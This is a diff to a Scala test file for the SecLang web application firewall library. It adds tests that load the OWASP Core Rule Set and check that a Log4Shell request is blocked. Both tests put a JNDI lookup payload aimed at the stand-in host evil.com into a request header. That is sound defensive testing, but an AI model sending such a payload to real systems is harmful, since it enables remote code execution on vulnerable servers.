@@ -2,7 +2,7 @@ package com.cloud.apim.seclang.test
 
 import com.cloud.apim.seclang.model.Disposition._
 import com.cloud.apim.seclang.model._
-import com.cloud.apim.seclang.scaladsl.SecLang
+import com.cloud.apim.seclang.scaladsl.{SecLang, SecLangPresets}
 
 class SecLangFactoryTest extends munit.FunSuite {
 
@@ -68,5 +68,89 @@ class SecLangFactoryTest extends munit.FunSuite {
     assertEquals(failing_res_2.disposition, Block(403, Some("someone used firefox to access"), Some(1)))
     assertEquals(passing_res_1.disposition, Continue)
     assertEquals(passing_res_2.disposition, Continue)
+  }
+
+  test("remote http crs test") {
+    val factory = SecLang.factory(Map("crs" -> SecLangPresets.coreruleset))
+    val rulesConfig = List(
+      "@import_preset crs",
+      "SecRuleEngine On"
+    )
+    val passing_ctx = RequestContext(
+      method = "GET",
+      uri = "/",
+      headers = Map(
+        "Host" -> List("www.owasp.org"),
+        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+      )
+    )
+    factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
+    val failing_ctx = RequestContext(
+      method = "GET",
+      uri = "/",
+      headers = Map(
+        "Host" -> List("www.foo.bar"),
+        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
+        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+      ),
+      query = Map("q" -> List("test")),
+      body = None
+    )
+    val failing_res = factory.evaluate(rulesConfig, failing_ctx, phases = List(1, 2)).displayPrintln()
+    assertEquals(failing_res.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
+  }
+
+  test("local fs crs test") {
+    val crs = SecLangPreset.fromSource(
+      name = "crs",
+      rulesSource = ConfigurationSourceList(
+        List(
+          RawConfigurationSource(
+            """SecAction \
+              |    "id:900990,\
+              |    phase:1,\
+              |    pass,\
+              |    t:none,\
+              |    nolog,\
+              |    tag:'OWASP_CRS',\
+              |    ver:'OWASP_CRS/4.22.0',\
+              |    setvar:tx.crs_setup_version=4220"
+              |""".stripMargin),
+          FileScanConfigurationSource("./test-data/coreruleset/rules", """.*\.conf""")
+        )
+      ),
+      filesSource = FilesSourceList(
+        List(
+          FsScanFilesSource("./test-data/coreruleset/rules", """.*\.data""")
+        )
+      ),
+    )
+    val factory = SecLang.factory(Map("crs" -> crs))
+    val rulesConfig = List(
+      "@import_preset crs",
+      "SecRuleEngine On"
+    )
+    val passing_ctx = RequestContext(
+      method = "GET",
+      uri = "/",
+      headers = Map(
+        "Host" -> List("www.owasp.org"),
+        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+      )
+    )
+    factory.evaluate(rulesConfig, passing_ctx, phases = List(1, 2)).displayPrintln()
+    val failing_ctx = RequestContext(
+      method = "GET",
+      uri = "/",
+      headers = Map(
+        "Host" -> List("www.foo.bar"),
+        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
+        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+      ),
+      query = Map("q" -> List("test")),
+      body = None
+    )
+    val failing_res = factory.evaluate(rulesConfig, failing_ctx, phases = List(1, 2)).displayPrintln()
+    assertEquals(failing_res.disposition, Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
   }
 }
